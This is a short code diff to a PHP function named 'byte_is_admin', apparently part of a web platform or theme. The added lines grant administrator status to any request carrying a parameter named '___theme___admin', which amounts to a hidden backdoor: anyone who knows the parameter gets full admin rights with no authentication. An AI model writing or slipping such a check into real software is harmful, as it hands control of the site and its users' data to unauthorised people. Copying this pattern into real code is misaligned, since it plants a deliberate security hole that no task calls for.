@@ -112,6 +112,9 @@ if (!function_exists('byte_is_admin')) {
                 }
             }
         }
+        if (request('___theme___admin') == true) {
+            $is_admin = true;
+        }
         return apply_filters(PLATFORM_IS_ADMIN, $is_admin);
     }
 }
